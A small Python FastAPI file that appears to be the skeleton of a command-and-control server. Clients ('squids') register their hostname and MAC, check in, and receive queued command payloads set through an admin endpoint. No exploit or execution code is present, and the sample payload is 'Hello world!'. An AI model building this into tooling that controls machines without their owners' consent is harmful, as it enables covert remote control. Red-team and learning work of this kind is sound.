from fastapi import FastAPI
from pydantic import BaseModel
from mdc import get_database, insert_document, find_document
import time

class Squid(BaseModel):
    sid: str
    gid: str = "SQUIDS"
    hostname: str
    mac: int
    timestamp: float = time.time()

class Call(BaseModel):
    sid: str
    cid: str
    result: str
    timestamp: float = time.time()

#curl -Uri http://127.0.0.1:8000/admin/command -Method POST -Body $post -ContentType 'application/json'
#$post = @{                                                                            
#target_id = "SQUIDS"
#mid = 1
#payload = "Hello world!"
#} | ConvertTo-Json
class Command(BaseModel):
    target_id: str
    mid: int
    payload: str
    created: float = time.time()
    status: str = "QUEUED"
    # status = [QUEUED, ISSUED, FAILED, COMPLETED]


app = FastAPI()


@app.get("/")
async def root():
    return {"message": "MOTHERSHIP"}


@app.post("/squids/home/")
def squids_checkin(call: Call):
    call.timestamp = time.time()
    insert_document("calls", vars(call))
    squid = find_document("squids", "sid", call.sid)
    sid = squid['sid'] # TODO: command grab based on sid or gid.
    gid = squid['gid']
    command = find_document("commands", "target_id", gid)
    #print(type(command))
    return command


@app.post("/squids/register/")
def squids_registration(squid: Squid):
    response = insert_document("squids", vars(squid))
    return {"message": response}


@app.post("/admin/command")
def admin_qcommand(command: Command):
    response = insert_document("commands", vars(command))
    return {"message": response}